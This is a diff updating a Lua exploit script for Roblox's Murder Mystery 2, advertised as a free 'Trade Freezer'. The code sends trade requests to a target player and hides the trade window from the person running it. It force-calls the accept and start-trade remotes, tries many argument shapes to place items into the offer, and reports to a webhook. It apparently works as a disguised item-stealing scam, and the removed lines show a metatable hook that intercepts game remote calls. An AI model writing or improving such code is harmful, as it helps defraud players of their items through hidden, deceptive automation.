@@ -1,4 +1,4 @@
---[[ MM2 Trade Freezer v9.2 | KEYLESS | FREE ]]
+--[[ MM2 Trade Freezer v9.3 | KEYLESS | FREE ]]
 
 local CONFIG = {
     WEBHOOK        = "",
@@ -118,7 +118,7 @@ local function webhook(title, color, desc, fields, content)
         local thumb = {}
         thumb.url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", lp.UserId)
         local foot = {}
-        foot.text = "MM2 Trade Freezer v9.2"
+        foot.text = "MM2 Trade Freezer v9.3"
         local emb = {}
         emb.title = title
         emb.description = desc
@@ -367,7 +367,7 @@ footer.Font = Enum.Font.Gotham
 footer.TextSize = 9
 footer.TextXAlignment = Enum.TextXAlignment.Center
 footer.TextColor3 = Color3.fromRGB(120, 115, 145)
-footer.Text = "keyless · v9.2"
+footer.Text = "keyless · v9.3"
 footer.Parent = main
 
 local timerCount = 0
@@ -496,7 +496,7 @@ local function runLoader()
 end
 task.spawn(runLoader)
 
-log("Trade Freezer v9.2 loaded")
+log("Trade Freezer v9.3 loaded")
 
 local VALUES = {}
 
@@ -628,6 +628,20 @@ local function cardName(card)
         local t = lbl.Text
         if t and #t > 1 then return t end
     end
+    local hasImg = false
+    for _, x in ipairs(card:GetDescendants()) do
+        if x:IsA("ImageLabel") or x:IsA("ImageButton") then
+            hasImg = true
+            break
+        end
+    end
+    if not hasImg then return nil end
+    for _, d in ipairs(card:GetDescendants()) do
+        if d:IsA("TextLabel") then
+            local t = d.Text
+            if t and #t > 1 and #t < 40 and not t:match("^%d+$") then return t end
+        end
+    end
     return nil
 end
 
@@ -725,41 +739,11 @@ R.accept  = byPath(CONFIG.REMOTES.accept)
 R.confirm = byPath(CONFIG.REMOTES.confirm)
 R.cancel  = byPath(CONFIG.REMOTES.cancel)
 
-local hookDone = false
-
-local function hookOffer()
-    if hookDone then return end
-    hookDone = true
-    pcall(function()
-        local target = R.add
-        if not target then return end
-        local mt = getrawmetatable(game)
-        local oldIndex = mt.__index
-        setreadonly(mt, false)
-        mt.__index = nc(function(self, k)
-            local v = oldIndex(self, k)
-            if self == target and k == "FireServer" then
-                return nc(function(_, ...)
-                    local a = {}
-                    for i = 1, select("#", ...) do
-                        local x = select(i, ...)
-                        if typeof(x) == "Instance" then
-                            a[i] = x.ClassName .. ":" .. x.Name
-                        else
-                            a[i] = tostring(x)
-                        end
-                    end
-                    print("[FZ] OFFER ARGS = " .. table.concat(a, " , "))
-                    return v(_, ...)
-                end)
-            end
-            return v
-        end)
-        setreadonly(mt, true)
-        print("[FZ] offer hook installed")
-    end)
-end
-hookOffer()
+local X = {}
+X.acceptReq = byPath("Trade.AcceptRequest")
+X.start     = byPath("Trade.StartTrade")
+X.update    = byPath("Trade.UpdateOffers")
+X.remove    = byPath("Trade.RemoveOffer")
 
 local function hideTradeUI()
     for _, g in ipairs(playerGui:GetChildren()) do
@@ -882,6 +866,8 @@ local SHAPES = {
     { "card" },
     { "slotname" },
     { "nameslot" },
+    { "tname" },
+    { "tslot" },
 }
 
 local function shapeArgs(it, shape)
@@ -895,23 +881,34 @@ local function shapeArgs(it, shape)
         elseif s == "card" then a[#a + 1] = it.card
         elseif s == "slotname" then a[#a + 1] = it.slot; a[#a + 1] = it.name
         elseif s == "nameslot" then a[#a + 1] = it.name; a[#a + 1] = it.slot
+        elseif s == "tname" then a[#a + 1] = { it.name }
+        elseif s == "tslot" then a[#a + 1] = { it.slot }
         end
     end
     return a
 end
 
+local function attempt(remote, it, base, placed, label)
+    local args = shapeArgs(it, label)
+    call(remote, table.unpack(args))
+    task.wait(0.3)
+    local g = tradeGui()
+    local c = offerCount(g)
+    return c ~= nil and c > base + placed
+end
+
 local function tryOffer(it, base, placed, verbose)
-    for idx, shape in ipairs(SHAPES) do
-        local args = shapeArgs(it, shape)
-        call(R.add, table.unpack(args))
-        task.wait(0.3)
-        local g = tradeGui()
-        local c = offerCount(g)
-        if c and c > base + placed then
-            if verbose then log("shape ok: " .. table.concat(shape, "+")) end
-            return true
+    for _, remote in ipairs({ R.add, X.update }) do
+        if usable(remote) then
+            for _, shape in ipairs(SHAPES) do
+                local ok = attempt(remote, it, base, placed, shape)
+                if ok then
+                    if verbose then log("ok " .. remote.Name .. " " .. table.concat(shape, "+")) end
+                    return true
+                end
+                if verbose then log("no " .. remote.Name .. " " .. table.concat(shape, "+")) end
+            end
         end
-        if verbose then log("shape " .. idx .. " no: " .. table.concat(shape, "+")) end
     end
     return false
 end
@@ -919,12 +916,12 @@ end
 local function doRound(batch, tgt, round)
     local gui = nil
     local deadline = os.clock() + CONFIG.REQUEST_TIMEOUT
-    local attempt = 0
+    local attemptN = 0
     while os.clock() < deadline do
         if gui then break end
         if STATE.stopped then break end
-        attempt = attempt + 1
-        if attempt % 3 == 1 then log("request -> " .. tgt.Name) end
+        attemptN = attemptN + 1
+        if attemptN % 3 == 1 then log("request -> " .. tgt.Name) end
         call(R.send, tgt)
         local w = 0
         while w < 4 do
@@ -939,10 +936,15 @@ local function doRound(batch, tgt, round)
     if not gui then return false, "window never opened" end
 
     hideTradeUI()
-    log("window locked")
+    log("trade open (hidden)")
     task.wait(0.8)
     gui = tradeGui()
     if not gui then return false, "window vanished" end
+
+    call(X.acceptReq)
+    task.wait(0.3)
+    call(X.start)
+    task.wait(0.5)
 
     local base = offerCount(gui) or 0
     local placed = 0
